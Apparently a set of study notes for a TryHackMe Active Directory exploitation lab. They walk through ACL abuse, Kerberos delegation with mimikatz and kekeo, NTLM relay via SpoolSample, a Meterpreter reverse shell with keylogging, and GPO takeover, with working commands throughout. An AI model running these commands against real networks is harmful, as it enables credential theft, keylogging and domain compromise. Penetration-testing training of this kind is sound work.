# Exploiting Active Directory

### AD Exploitation

The exploitation phase exploits misconfigurations to perform a combination of lateral movement and privilege 
escalation until we reach a suitable position to execute our goals, as shown in the diagram below. This 
phase is usually combined with persistence, to ensure that we can't lose the new position we gain, and 
additional enumeration since our new position might allow us to acquire additional information about the lay 
of the land.

![Cyber kill chain](../pictures/kill-chain.png)

**Learning Objectives:**

- AD Delegation
- Forcing Authentication Relays
- Group Policy Objects
- Targeting AD Users
- Domain Trusts
- Silver and Golden Tickets

### Eploiting Permission Delegation

Active Directory can delegate permissions and privileges through a feature called Permission Delegation.
Delegation is what makes AD so powerful in organisations. Imagine we work for an organisation that has 50000 
employees. Since we care about security, we only have three users that have access to DA credentials. It 
would be impossible for those three users to field all requests from the users, such as resetting their 
passwords. Using Delegation, we can delegate the permission to force change a user's password to the 
Helpdesk team, meaning they now have a delegated privilege for this specific function. In principle, to keep 
Delegation secure, the principle of least privilege should be followed.

**Permission Delegation**

Permission Delegation attacks a.k.a ACL-based attacks

AD allows administrators to configure Access Control Entries (ACEs) that populates Discretionary Access 
Control Lists (DACLs), hence the name ACL-based attacks. Almost any AD object can be secured with ACEs, 
which then describe the allowed and denied permissions that any other AD object has against the target 
object.

However, if these ACEs are misconfigured, it may be possible for an attacker to exploit them. Let's look at 
our example again. If the IT Support team were granted the ForceChangePassword ACE over the Domain Users 
group, this would be considered insecure. Sure they would be able to reset the passwords of employees that 
forgot their passwords, but this misconfiguration would allow them to also reset the passwords of privileged 
accounts, such as the accounts that are members of the Domain Admins group essentially allowing for 
privilege escalation.

**Exploiting ACEs**

A significant amount of ACEs can be misconfigured, and the exploits for each vary. The [Bloodhound docs](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#) assist in explaining enumerated ACEs and how they can be exploited.

Notable ACEs:

- ForceChangePassword: We have the ability to set the user's current password without knowing their current 
password.

- AddMembers: We have the ability to add users (including our own account), groups or computers to the 
target group.

- GenericAll: We have complete control over the object, including the ability to change the user's password, 
register an SPN or add an AD object to the target group.

- GenericWrite: We can update any non-protected parameters of our target object. This could allow us to, for 
example, update the scriptPath parameter, which would cause a script to execute the next time the user logs 
on.

- WriteOwner: We have the ability to update the owner of the target object. We could make ourselves the 
owner, allowing us to gain additional permissions over the object.

- WriteDACL: We have the ability to write new ACEs to the target object's DACL. We could, for example, write 
an ACE that grants our account full control over the target object.

- AllExtendedRights: We have the ability to perform any action associated with extended AD rights against 
the target object. This includes, for example, the ability to force change a user's password.

In order to exploit these ACEs, we will need a method to interact with AD to make these requests. The two 
best options for this are: 

- AD-RSAT PowerShell cmdlets
- PowerSploit. 

Depending on the breach and the detection tools in the environment, one option may be stealthier.

**Bloodhound**

Execute SharpHound (same version as BloodHound installation!) on a windows machine connected to the domain

`SharpHound.exe --CollectionMethods All --Domain <DOMAIN> --ExcludeDCs`

Use scp to copy the zip file to our atacking machine:

`scp <USERNAME>@<WINDOWS-MACHINE>:C:/path/to/zip/file .`

Start Neo4j and BloodHound;

```
neo4j console

bloodhound --no-sandbox
```

Authenticate with Neo4j credentials.

**Privilege Escalation**

- Search for privileges associated with the user account
- Search for administrative privileges on all workstations
- View roads in bloodhound leading to accounts for privilege escalation
- Look for permission delegation misconfiguration leading to attack paths

A road from our Domain user to the T2 admins shows that a GenericWrite privilege for IT Support is delegated 
to domain which in turn allows IT Support group members ForceChangePassword of T" admins

Exploit the GenericWrite privilege delegation misconfiguration by adding your domain user to IT Support:

THMWRK1
```
powershell
Add-ADGroupMember "IT Support" -Members
```

**ForceChangePassword**

Find an account to takeover:

`Get-ADGroupMember -Identity "Tier 2 Admins"`

Set a new password:

```
$Password = ConvertTo-SecureString "NewPassword" -AsPlainText -Force
Set-ADAccountPassword -Identity "UsernameOfTarget" -Reset -NewPassword $Password
```

Note: Permissions can take a few minutes to propagate through the domain.

### Exploiting Kerberos Delegation

When talking about AD Delegation, Kerberos Delegation is what is usually being discussed, not Permission 
Delegation.

**Kerberos Delegation**

Kerberos Delegation enables an application to access resources hosted on a different server. An example of 
this would be a web server that needs to access a SQL database hosted on the database server for the web 
application that it is hosting. Without delegation, we would probably use an AD service account and provide 
it with direct access to the database. When requests are made on the web application, the service account 
would be used to authenticate to the database and recover information.

However, we can allow this service account to be delegated to the SQL server service. Once a user logs into 
our web application, the service account will request access to the database on behalf of that user. This 
means that the user would only be able to access data in the database that they have the relevant 
permissions for without having to provide any database privileges or permissions to the service account 
itself.

**Constrained vs Unconstrained**

Unconstrained is the least secure and sets no limits to the delegation. If a user with the 
"TRUSTED_FOR_DELEGATION" flag set authenticates to a host with Unconstrained Delegation configured, a 
ticket-granting ticket (TGT) for that user account is generated and stored in memory so it can be used later 
if needed.

Suppose an attacker can compromise a host that has Unconstrained Delegation enabled. In that case, they 
could attempt to force a privileged account to authenticate to the host, which would allow them to intercept 
the generated TGT and impersonate the privileged service.

To combat the security failings of Unconstrained Delegation, Microsoft introduced Constrained Delegation in 
2003. Constrained Delegation restricts what services an account can be delegated to, limiting exposure if an 
account is compromised. The following are examples of services that can be configured for delegation:

- HTTP - Used for web applications to allow pass-through authentication using AD credentials.
- CIFS - Common Internet File System is used for file sharing that allows delegation of users to shares.
- LDAP - Used to delegate to the LDAP service for actions such as resetting a user's password.
- HOST - Allows delegation of account for all activities on the host.
- MSSQL - Allows delegation of user accounts to the SQL service for pass-through authentication to databases.

Exploiting Constrained Delegation is usually more complex than exploiting Unconstrained Delegation since the 
delegated account can't just be used for everything. However, it can still be used for some powerful 
exploitation.

An example of this would be if we were able to compromise an AD account that had constrained delegation 
configured. By knowing the plaintext password or even just the NTLM hash of this account, we could generate 
a TGT for this account, then use the TGT to execute a ticket-granting server (TGS) request for any 
non-sensitive user account in order to access the service as that user.

**Resource-Based Constrained Delegation**

Introduced by Microsoft in 2012, Resource-Based Constrained Delegation (RBCD) once again provided additional 
restrictions on Kerberos Delegation for security. RBCD changes the delegation model entirely. 

Instead of specifying which object can delegate to which service, the service now specifies which objects 
can delegate to it. This allows the service owner to control who can access it. In our web application 
example, this means that instead of specifying that the web service account can delegate to the database 
service to access the database, we can now specify that on the database service that the web service account 
is allowed to delegate access to it.

Let's say that we have permission to configure RBCD for a service. This means we have the ability to set the 
msDS-AllowedToActOnBehalfOfOtherIdentity attribute for the AD Object. We can populate this attribute with 
the details of an AD account that we have access to. To now gain access to the service, we can generate a 
TGT for the account we control, which will allow us to interact with this service. [Example here](https://blog.netwrix.com/2022/09/29/resource-based-constrained-delegation-abuse/)

**Constrained Delegation Exploitation**

Exploiting Constrained Delegation

Enumerate accounts eligible for exploitation with PowerView

```
PS C:\>Import-Module C:\Tools\PowerView.ps1 
PS C:\>Get-NetUser -TrustedToAuth
```

One account, svcIIS, has the TRUSTED_TO_AUTH_FOR_DELEGATION flag and the msds-allowedtodelegateto attribute 
for http/THMSERVER1.za.tryhackme.loc and WSMAN/THMSERVER1.za.tryhackme.loc. This means the svcIIS account 
can delegate the HTTP and WSMAN services on the target THMSERVER1. 

PowerShell remoting uses the HTTP and WSMAN services allowing us to start remote sessions with Delegation 
to gain Tier 1 Admin access to the target. 

As an Administrator on jump server, run mimikatz to dump LSASecrets showing plain text passwords

```
token::elevate
lsadump:secrets
```

The plain text password for svcIIS is dumped, allowing us to perform a Kerberos delegation attack.

Create a TGT for the compromised service account with kekeo.exe

`tgt::ask /user:svcIIS /domain:za.tryhackme.loc /password:password`

Next, we forge TGS requests for the account we want to impersonate for both services (HTTP and WSMAN)

```
# WSMAN
tgs:s4u /tgt:<TGT-FROM-KEKEO> /user:<USER-TO-IMPERSONATE> /service:WSMAN/THMSERVER1.za.tryhackme.loc
# HTTP
tgs:s4u /tgt:<TGT-FROM-KEKEO> /user:<USER-TO-IMPERSONATE> /service:http/THMSERVER1.za.tryhackme.loc
```

Import the TGS tickets into mimikatz

```
# Check privilege
privilege::debug

# import WSMAN TGS
kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_WSMAN~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi

# import HTTP TGS
kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi
``` 

Exit mimikatz and verify the tickets are imported with `klist`

Create a PSSession on THMSERVER1 to gain access as a Tier 1 Admin

```
New-PSSession -ComputerName thmserver1.za.tryhackme.loc

Enter-PSSession -ComputerName thmserver1.za.tryhackme.loc
```

### Exploiting Automated Relays

In this task we will take a look at some automated relays. Authentication attempts are constantly flying 
across the network, and as shown in the Breaching AD room, if we are lucky, we can intercept some of these 
challenges to gain access. What if we can coerce authentication to occur?

Although we already have privileged access to THMSERVER1, we could be in a position where we did not have 
access to a constrained delegation exploit. This is another excellent attack that can be performed to gain 
privileged access to hosts. 

**Machine Accounts**

Unless tampered with, machine account passwords are uncrackable. By default, they are 120 characters (UTF16)
long and are automatically rotated every 30 days.

In AD, these machine accounts are used quite a bit in different services. Different domain controllers use 
their machine accounts to synchronise AD updates and changes. When you request a certificate on behalf of 
the host you are working on, the machine account of that host is used for authentication to the AD 
Certificate Service.

There is an exceptional case in AD, where one machine has admin rights over another machine. Essentially in 
the AD configuration, administrative permissions over a host have been granted to another host. However, 
these instances provide a very interesting attack vector for coercing authentication.

Identify instances where a computer has the "AdminTo" relationship over another computer by writing a custom
Bloodhound query in the Analysis tab.

Bloodhound AdminTo query

`MATCH p=(c1:Computer)-[r1:MemberOf*1..]->(g:Group)-[r2:AdminTo]->(n:Computer) RETURN p`

**The Printer Bug**

*It's not a bug, it's  a feature - Microsoft*

When this was reported, Microsoft responded that this was a feature. The printer bug is a "feature" of the 
MS-RPRN protocol (PrintSystem Remote Protocol), which allows a domain user to remotely force a target host 
running the Print Spooler service to authenticate to an arbitrary IP address. 

There have been a few of these bugs in recent years: Spooler, PetitPotam, PrintNightmare. Microsoft claims 
that the only bug is that some of these did not require AD credentials at all, but this issue has been 
resolved through security patches.

Therefore, to exploit this, apart from machine account administrative privileges, we also need to meet the 
following four conditions:

1. A valid set of AD account credentials.
2. Network connectivity to the target's SMB service.
3. The target host must be running the Print Spooler service.
4. The hosts must not have SMB signing enforced.

Condition 1 and 2 have been met already. The only two we need to ensure works are conditions 3 and 4.

**Print Spooler Service**

Use a WMI query to query the Print Spooler service's current state

`GWMI Win32_Printer -ComputerName thmserver2.za.tryhackme.loc`

We may get an access denied error, then we can try the PowerShell `Get-PrinterPort` command

`Get-PrinterPort -ComputerName thmserver2.za.tryhackme.loc`

If both commands throw an error we may need to take a leap of faith and assume condition 3 is met.

**SMB signing**

In order to relay the coerced authentication attempt, SMB signing should not be enforced. It should be noted 
that there is a difference between SMB signing being allowed and SMB signing being enforced. Since some 
legacy systems do not support SMB signing, by default, the configuration of SMB is that signing is allowed 
but not enforced, meaning that it will only be used if supported.

Since we will be hosting a malicious SMB server, we can ensure our server does not support signing, forcing 
the target not to sign the SMB authentication attempt.

To verify that THMSERVER1 and THMSERVER2 do not have SMB signing enforced, we can use Nmap:

`nmap --script=smb2-security-mode -p445 thmserver1.za.tryhackme.loc thmserver2.za.tryhackme.loc`

**Exploiting Authentication Relays**

We will be using [SpoolSample](https://github.com/leechristensen/SpoolSample) to exploit the authentication relay. It is a C# exploit but has already been
compiled for you and stored in the C:\Tools\ directory on THMWRK1.  We will use Spoolsample.exe to coerce 
THMSERVER2 to authenticate to us on our AttackBox and then Impacket's ntlmrelayx.py to relay the 
authentication attempt THMSERVER1. Note that if you are using your own VM, you will need to make sure you 
have the updated version of Impacket that supports SMBv2.

The first step is to set up the NTLM relay using the IP address of the target, if we use the hostname the 
host could request Kerberos authentication:

`python3 ntlmrelayx.py -smb2support -t smb://"THMSERVER1 IP" -debug`

Using SpoolSample to coerce authentication from a jump server (THMWRK1) on the network:

`SpoolSample.exe THMSERVER2.za.tryhackme.loc "Attacker IP"`

You should receive an authentication attempt and a relay to the target (THMSERVER1), by specifying no 
command the relay should dump the SAM hashes of the target.

To execute a command on response use the `-c` option

`python3 ntlmrelayx.py -smb2support -t smb://"THMSERVER1 IP" -c 'whoami /all' -debug`

### Exploiting AD Users

Targeting AD users can also be seen as post-exploitation but is often an excellent thing to use when we are 
still performing exploitation to reach a suitable position for goal execution.

**Users and User Behaviour**

Users are often the weakest link in the security chain. Just think about weak passwords and bad habits, such 
as granting overly permissive permissions. It would be ignorant and ineffective to overlook this attack 
surface. While it is good to build up a proper enumeration and attack methodology against AD users, in this 
task, we will focus on two elements:

- Credential Management - How users store their credentials. In AD, this is quite important since users may 
have multiple sets of credentials and remembering all of them can be a hassle.

- Keylogging - Often, during exploitation, we need to understand how normal users interact with a system. 
Together with screengrabs, Keylogging can be a useful tool to gain this understanding from an attacker's 
perspective.

**Hunting for Credentials**

Search User directories for password databases, files that may contain passwords, run meterpreter modules to 
extract passwords from web browsers, anything you can think of.

SYSTEM is Sometimes Too Privileged

Meterpreter has a built-in keylogger. This will be useful for extracting the user's keystrokes. However, we 
can't just start this keylogger and hope for the best since our shell is currently running in the SYSTEM 
context. SYSTEM won't be typing any keystrokes, so this won't help us. To capture the correct user's 
credentials, we will need to ensure that our shell is running in the context of that user.

Fortunately, Meterpreter provides us with a migrate feature, and since we are running as SYSTEM, we should 
be able to migrate to any process. You have remote code execution on THMSERVER1, use this to get a 
Meterpreter shell. If you need a recap on using Meterpreter and Metasploit, here is a module on its use. 
However for a quick rundown, you can use the following command to generate a PowerShell meterpreter payload:

`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=exploitad LPORT="Listening port" -f psh -o shell.ps1`

You can then also use the following to create the associated listener in the msfconsole:

`sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST exploitad; set LPORT "listening port'; exploit"`

You can host your meterpreter shell using a Python webserver and then copy it using something like this:

`certutil.exe -urlcache -split -f http:///shell.ps1`

Once you have a meterpreter shell, you can continue. The first step is to see if the users have any running 
process

`meterpreter> ps | grep explorer`

If there are running explorer processes migrate to one of them

`meterpreter> migrate 3122`

Start the keylogger and wait, then dump the captured keystrokes

```
meterpreter> keyscan_start
meterpreter> keyscan_dump
```

This gives us the password for the .kdbx file which contains credentials for an account we haven't seen yet, 
svcServMan

### Exploiting GPOs

Perform some enumeration to find out if the svcServMan account can be useful to us.

In the Bloodhound Node info tab, First Degree Object Control shows the number of objects in Active Directory 
that this user can take control of, without relying on security group delegation. 

First Degree Object Control for the svcServMan account shows it has GenericWrite permissions over the 
Management Server Pushes Policy, a Group Policy Object (GPO).

By looking at the Affected Computer Objects for the Management Server Pushes GPO we see that it's applied to 
THMSERVER2, providing an oportunity for further AD exploitation.

**Group Policy Objects**

The SYSVOL directory is where AD GPOs are stored to be replicated to domain-joined machines. A GPO is a 
virtual collection of policy settings. Each GPO has a unique name, called a GUID. That's why if you try to 
read the contents of the SYSVOL directory, it won't make a lot of sense with all the random names.

Each Windows computer has a Local Policy Configuration. This contains several notable configurations such as:

- Application configuration for services such as the Firewall, Anti-Virus, and Applocker.
- Local Group membership such as the Administrator or Remote Desktop Users groups.
- Startup configuration such as scripts that should be executed.
- Security and protocol settings such as SMBv1 support.

These are just a few examples. There are a significant amount of configuration options that can be set. 

**Group Policy Mangement**

If you only have one Windows computer, it is easy to change the local policy configuration directly on the 
host. However, you need a mechanism to deploy a configuration from a central location in large 
organisations. This is where Group Policy Management (GPM) comes into play. Instead of defining policies 
locally on each machine, GPM allows us to define policies directly on the AD structure. Essentially, we can 
define GPOs for AD objects, such as a specific OU or group.

Domain-joined computers would then pull all policies from SYSVOL periodically and apply the relevant ones. 
By default, policies are replicated every 15 minutes through the gpupdate application. We can, however, also 
manually execute this application from Command Prompt to apply policies instantly.

**Exploiting GPOs**

Although there are several ways in which GPOs can be exploited, we will stick with the simple solution of 
adding an AD account we control to both the local Administrators and local Remote Desktop Users groups. This 
will allow us administrative privileges on THMSERVER2 and the ability to RDP in. We could also use the 
exposed SSH port, but not many organisations have upgraded to providing SSH access. Hence, RDP access or 
conventional lateral movement techniques like SMBExec are safer.

In order to modify the GPO, we need to access Group Policy Management as the AD user that has the relevant 
permissions. We could RDP into THMSERVER1 as the user, but that may kick the user out of their active 
session, raising suspicion. Instead, we will RDP into THMWRK1 with either our normal or our Tier 2 Admin 
account, inject the AD user's credentials into memory using the runas command from an administrative command 
prompt, and open MMC to modify the GPO.

RDP to the jump server with our standard user 

`xfreerdp /v:thmwrk1.za.tryhackme.loc /u:user /p:password`

From an admin command prompt inject the AD user's credentials into memory using the runas command

`runas /netonly /user:za.tryhackme.loc\<AD-USERNAME> cmd.exe`

Check the credentials are correct

`dir \\za.tryhackme.loc\sysvol`

Start the Microsoft Management Console `mmc` 

In the MMC window:

1. click File -> Add/Remove Snap-in
2. Select the Group Policy Management Snap-in and click Add
3. Click OK

Navigate to the GPO that our user has permission to modify 

Servers -> Management Servers -> Management Server Pushes

Right click the GPO and select Edit, then add our account to the local groups

1. Expand Computer Configuration
2. Expand Policies
3. Expand Windows Settings
4. Expand Security Settings
5. Right Click on Restricted Groups and select Add Group
6. Click Browse, enter IT Support and click Check Names
7. Click Okay twice

The first filter is not used. For the second filter, we want to add both the Administrators and Remote 
Desktop Users groups.

Once the configuration has been made, we can click Apply and OK. Now, all we need to do is wait for a 
maximum of 15 minutes for the GPO to be applied.

After this, our initial account that we made a member of the IT Support group will now have administrative 
and RDP permissions on THMSERVER2

### Exploiting Certificates
